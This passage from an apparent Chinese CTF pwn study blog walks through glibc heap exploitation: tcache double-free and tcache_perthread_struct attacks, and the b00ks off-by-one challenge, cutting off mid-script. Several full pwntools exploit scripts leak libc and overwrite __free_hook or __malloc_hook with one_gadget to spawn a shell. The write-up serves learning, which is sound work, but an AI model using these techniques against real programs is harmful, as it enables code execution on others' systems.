class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)</span></span><br><span class="line">p=process(<span class="string">'./gundam'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line">build(<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">blow_up()</span><br><span class="line">visit()</span><br><span class="line">addr = (p.recvuntil(<span class="string">"Type[7]"</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(hex(u64(addr)))</span><br><span class="line">base=u64(addr)<span class="number">-0x3afca0</span></span><br><span class="line">print(hex(base))</span><br><span class="line">free_hook=base+<span class="number">0x3b18e8</span></span><br><span class="line">print(<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">blow_up()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">build(p64(base+<span class="number">0x41780</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="更改tcache-perthread-struct"><a href="#更改tcache-perthread-struct" class="headerlink" title="更改tcache_perthread_struct"></a>更改tcache_perthread_struct</h3><p><code>tcache_perthread_struct</code>一般是堆开头的第一个堆块，大小为0x250(amd64).我们可以通过gdb中<code>bins</code>与<code>p *(struct tcache_perthread_struct*)</code>来查看其信息。</p><p><img src="image-20210418133641326.png" alt="image-20210418133641326"></p><p>我们也可以同过其他tache漏洞，使我们获得更改此处的权利。就可以让某大小计数大于<code>TCACHE_FILL_COUNT</code>（从而假造tache已满的情况泄露libc）。也可以篡改<code>entries</code>中保存的指针指向任意地方。</p><h4 id="例题：-V-amp-N2020-公开赛-easyTHeap"><a href="#例题：-V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="例题：[V&amp;N2020 公开赛]easyTHeap"></a>例题：[V&amp;N2020 公开赛]easyTHeap</h4><p>题目限制了只能free3次和malloc 7次任意大小chunk。</p><p>利用二次释放在<code>tcache_perthread_struct</code>处，创造fack chunk。从而修改<code>tcache_perthread_struct</code>的值将假造tache已满的情况。从而free出libc。</p><p>再改<code>tcache_perthread_struct</code>的entries区域的内容，使某一大小的bin的指针变成我们fack chunk的指针从而改写<code>__realloc_hook</code>与<code>__moalloc_hook</code>，从而执行one_gadget.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'/glibc/2.27/amd64/lib/libc.so.6'</span>)</span><br><span class="line">p=process(<span class="string">'./vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line"><span class="comment">#p.recvuntil('choice')</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'idx'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">p.sendline((text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'idx'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex((addr)))</span><br><span class="line">log.info(<span class="string">'tcache struct:'</span>+hex((addr<span class="number">-0x250</span>)))</span><br><span class="line">edit(<span class="number">1</span>,p64(addr<span class="number">-0x250</span>))</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#3</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">3</span>,p8(<span class="number">7</span>)*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">log.info(<span class="string">'main_arena:'</span>+hex((addr)))</span><br><span class="line">base=addr<span class="number">-0x3afc48</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex((base)))</span><br><span class="line">malloc=base+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'malloc:'</span>+hex((malloc)))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'b'</span>*<span class="number">0x48</span>+p64(malloc<span class="number">-0x20</span>+<span class="number">0xd</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x41612 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x41666 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdeed2 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,p8(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x41666</span>+base)+p64(base+e.symbols[<span class="string">'__libc_realloc'</span>]+<span class="number">0xa</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Tcache是2.26 libc中新引入的一种缓存的机制,由于它对每个线程增加一个bin缓存，这样能显著地提高性能.这样一个机制在提高效率的同时也带来了安全隐患.</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>从对b00k题目学习中初习off-by-one——学pwn小记(7)</title>
    <link href="lexsd6.github.io/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/"/>
    <id>lexsd6.github.io/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/</id>
    <published>2021-04-09T13:51:14.543Z</published>
    <updated>2021-04-10T05:56:55.086Z</updated>
    
    <content type="html"><![CDATA[<p> off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节的情况。我看 off-by-one的理论是字字都看得懂，但是一到off-by-one的实际利用时确是不知道怎么办了。于是找了Asis CTF 2016 b00ks这道经典off-by-one题来复现学习。</p><a id="more"></a><h2 id="b00ks"><a href="#b00ks" class="headerlink" title="b00ks"></a>b00ks</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>通过分析题目可以发现，在处理author name这个函数有一个数组越界。</p><p><img src="image-20210409221800526.png" alt="image-20210409221800526"></p><p>仔细观察sub_9F5函数内部细节，可以看到当i=a2，<code>for</code>循环依然会进行一次读取字符操作。导致我们实际读取了a2+1个字符。（即是<code>off-by-one</code> 漏洞）</p><p><img src="image-20210409222059169.png" alt="image-20210409222059169"></p><p>同时通过审计加入书籍的函数，我们发现每加入一本书，有三个chunk被创建，第一个chunk是关于书名的，第二个是关于书的介绍，第三个是书前两个地址的保存。</p><p><img src="image-20210409223627387.png" alt="image-20210409223627387"></p><p>分析删除函数可以看到，只是free的指针和将指向book chunk的指针地址清零并没有清空chunk里的内容。（可能有uaf）</p><p><img src="image-20210409224516738.png" alt="image-20210409224516738"></p><p>分析打印函数，可以看到，在调用时不仅输出了所有的还存在的chunk的book name 与description还输出了author name。</p><p><img src="image-20210409225141070.png" alt="image-20210409225141070"></p><p>同时还发现author name与保存book chunk addr的数组挨得很近：</p><p><img src="image-20210409225844109.png" alt="image-20210409225844109"></p><p>book chunk addr的数组可能被溢出到。经过gdb发现，刚好可以溢出一位<code>\x00</code>到book chunk addr的数组的第一个元素中。</p><p><img src="image-20210409231252054.png" alt="image-20210409231252054"></p><p>又book chunk addr的数组里存放的是book chunk的地址，book chunk里存放着book name chunk和description chunk的地址。故，我们可以在第一本book的description chunk里创造一个伪造是book chunk的fake chunk，然后通过author name溢出的一个<code>\x00</code>让book chunk addr的数组的第一个元素指针变成我们伪造fake chunk。这样我们就控制住了第一个book中book chunk。（但一次程序时只能控制一次）</p><h3 id="利用数组越界得到book1-chunk-addr"><a href="#利用数组越界得到book1-chunk-addr" class="headerlink" title="利用数组越界得到book1 chunk addr"></a>利用数组越界得到book1 chunk addr</h3><p>同时根据上面的分析，我们若在创造程序时，写入了0x20个字符。字符串结尾的’\x00’会在新的一本书创建时覆盖掉。</p><p><img src="image-20210410120812585.png" alt="image-20210410120812585"></p><p>导致我们在输出author book时book1 chunk addr被泄露掉。</p><p><img src="image-20210410120951639.png" alt="image-20210410120951639"></p><p>从而可以推算出任意chunk的地址</p><h3 id="思路1：利用mmap特性leak基地址"><a href="#思路1：利用mmap特性leak基地址" class="headerlink" title="思路1：利用mmap特性leak基地址"></a>思路1：利用mmap特性leak基地址</h3><p>同时由于mmap 在申请一块超级大内存时,会单独映射一块内存而不是从top chunk划分.这个内存地址与libc的基地址的相对地址是不变的.因此我们可以创建在第二个book时用mmap申请两个chunk.再通过fake打印第二个book chunk中保存地址从而获得libc基地址.</p><p><img src="image-20210410113701106.png" alt="image-20210410113701106"></p><p>我们再利用fake chunk的内容修改book2 chunk 的里description chunk地址修改为<code>__free_hook</code>的地址,这样我们在编辑book2 description时,其实是在向<code>__free_hook</code>写入内容.我们可以用此方法写入one_gadget.</p><p>（<code>__free_hook</code>的地址我们可以在gdb中，用<code>x/36gx &amp;__free_hook</code>来找到<code>__free_hook</code>的地址。）</p><p>再通过free来触发。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./b00ks'</span>)</span><br><span class="line">p=process(<span class="string">'./b00ks'</span>)</span><br><span class="line">p.sendline(<span class="string">'s'</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(ns,na,ds,da)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name size:'</span>,str(ns))</span><br><span class="line">p.sendlineafter(<span class="string">'name'</span>,na)</span><br><span class="line">p.sendlineafter(<span class="string">'description size'</span>,str(ds))</span><br><span class="line">p.sendlineafter(<span class="string">'description'</span>,da)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,da)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"edit"</span>,str(num))</span><br><span class="line">p.sendlineafter(<span class="string">'description'</span>,da)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">()</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'num'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(name)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露book1 chunk addr</span></span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="string">'cba'</span>)</span><br><span class="line">add(<span class="number">0x42000</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">0x42000</span>,<span class="string">'cba'</span>)</span><br><span class="line">echo()</span><br><span class="line">p.recvuntil(<span class="string">'Author: ssssssssssssssssssssssssssssssss'</span>)</span><br><span class="line">x=p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>)</span><br><span class="line">print(hex(u64(x)))</span><br><span class="line">book1=u64(x)</span><br><span class="line">book2=book1+<span class="number">0x30</span></span><br><span class="line">log.info(<span class="string">'book1_dr:'</span>+hex(book1))</span><br><span class="line">log.info(<span class="string">'book2_dr:'</span>+hex(book2))</span><br><span class="line"><span class="comment">#通过mmap 泄露出基地址</span></span><br><span class="line">fake=p64(<span class="number">1</span>)+p64(book2+<span class="number">0x8</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line">change(<span class="string">'A'</span>*<span class="number">0X20</span>)</span><br><span class="line">echo()</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">x=p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>)</span><br><span class="line">print(hex(u64(x)))</span><br><span class="line">book2_mmap=u64(x)</span><br><span class="line">log.info(<span class="string">'book2_mmap:'</span>+hex(book2_mmap))</span><br><span class="line">base=book2_mmap<span class="number">-0x590010</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(base))</span><br><span class="line"><span class="comment">#修改book2 chunk 中 description addr 为free hook地址</span></span><br><span class="line"><span class="comment">#并在free hook写入one_gadget</span></span><br><span class="line">free_hook=<span class="number">0x3c67a8</span>+base</span><br><span class="line">log.info(<span class="string">'free_hook:'</span>+hex(free_hook))</span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(base+<span class="number">0x4527a</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="思路2-Fastbin-Attack-泄露libc写入shell"><a href="#思路2-Fastbin-Attack-泄露libc写入shell" class="headerlink" title="思路2: Fastbin Attack 泄露libc写入shell"></a>思路2: Fastbin Attack 泄露libc写入shell</h3><p>审计代码可以发现，程序在释放book时，并没有将所有申请的chunk的内容清空。我们可以申请一个unsorted bin ，再释放掉从而leak出main_arena附近一地址从而算出基地址。在创造一个0x70的fast bin，让其fd能被我们控制写。 再控制fake chunk的让有读能力的book name chunk的地址指向free 出unsorted bin所泄露的地址，有写能力的description chunk的地址指向fast bin的fd。</p><p><img src="image-20210410133403130.png" alt="image-20210410133403130"></p><p>再修改fast bin的fd指向我们在<code>__malloc_hook</code>-0x30+0xd处的falk chunk。</p><p><img src="image-20210410133926118.png" alt="image-20210410133926118"></p><p>由于利用这个新伪造的chunk，本地<code>__malloc_hook</code>写one_gadget没有打通。所以覆盖<code>__realloc_hook</code>及<code>__malloc_hook</code>处的数据。利于<code>__realloc_hook</code>来调节堆栈。</p><p><img src="image-20210410133852514.png" alt="image-20210410133852514"></p><p>于是在<code>__realloc_hook</code>处写one_gadget的地址，在<code>__malloc_hook</code>处写<code>__libc_realloc</code>的地址。</p><p>我们通过gdb 命令 <code>disassemble __libc_realloc</code>来搜寻我们适合的地址。</p><p><img src="image-20210410134609947.png" alt="image-20210410134609947"></p><p>前面几个push的地址我们都可以看情况来选用。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#e=ELF('./spwnlibc-2.23.so')</span></span><br><span class="line">p=process(<span class="string">'./b00ks'</span>)<span class="comment">#remote('node3.buuoj.cn',29407)</span></span><br><span class="line"><span class="comment">#process('./b00ks')</span></span><br><span class="line">p.sendline(<span class="string">'s'</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(ns,na,ds,da)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name size:'</span>,str(ns))</span><br><span class="line">p.sendlineafter(<span class="string">'name'</span>,na)</span><br><span class="line">p.sendlineafter(<span class="string">'description size'</span>,str(ds))</span><br><span class="line">p.sendlineafter(<span class="string">'description'</span>,da)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,da)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"edit"</span>,str(num))</span><br><span class="line">p.sendlineafter(<span class="string">'description'</span>,da)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">()</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(name)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name'</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="string">'cba'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">0x60</span>,<span class="string">'cba'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">echo()</span><br><span class="line">p.recvuntil(<span class="string">'Author: ssssssssssssssssssssssssssssssss'</span>)</span><br><span class="line">x=p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>)</span><br><span class="line">print(hex(u64(x)))</span><br><span class="line">book1=u64(x)</span><br><span class="line">book2=book1+<span class="number">0x30</span></span><br><span class="line">log.info(<span class="string">'book1_dr:'</span>+hex(book1))</span><br><span class="line">log.info(<span class="string">'book2_dr:'</span>+hex(book2))</span><br><span class="line">log.info(<span class="string">'book3_dr:'</span>+hex(book1+<span class="number">0xc0</span>))</span><br><span class="line"><span class="comment">#unsorted bin泄露地址</span></span><br><span class="line">fake=p64(<span class="number">1</span>)+p64(book2+<span class="number">0x8</span>)+p64(book1+<span class="number">0xc0</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line">change(<span class="string">'b'</span>*<span class="number">0x20</span>)</span><br><span class="line">echo()</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">x=p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>)</span><br><span class="line">addr=u64(x)</span><br><span class="line">log.info(<span class="string">'bin_addr:'</span>+hex(addr))</span><br><span class="line">base=addr<span class="number">-0x3c4b78</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(base))</span><br><span class="line">malloc_hook=<span class="number">0x3c4b10</span>+base</span><br><span class="line">log.info(<span class="string">'malloc_hook:'</span>+hex(malloc_hook))</span><br><span class="line"><span class="comment">#修改fd 让伪造chunk 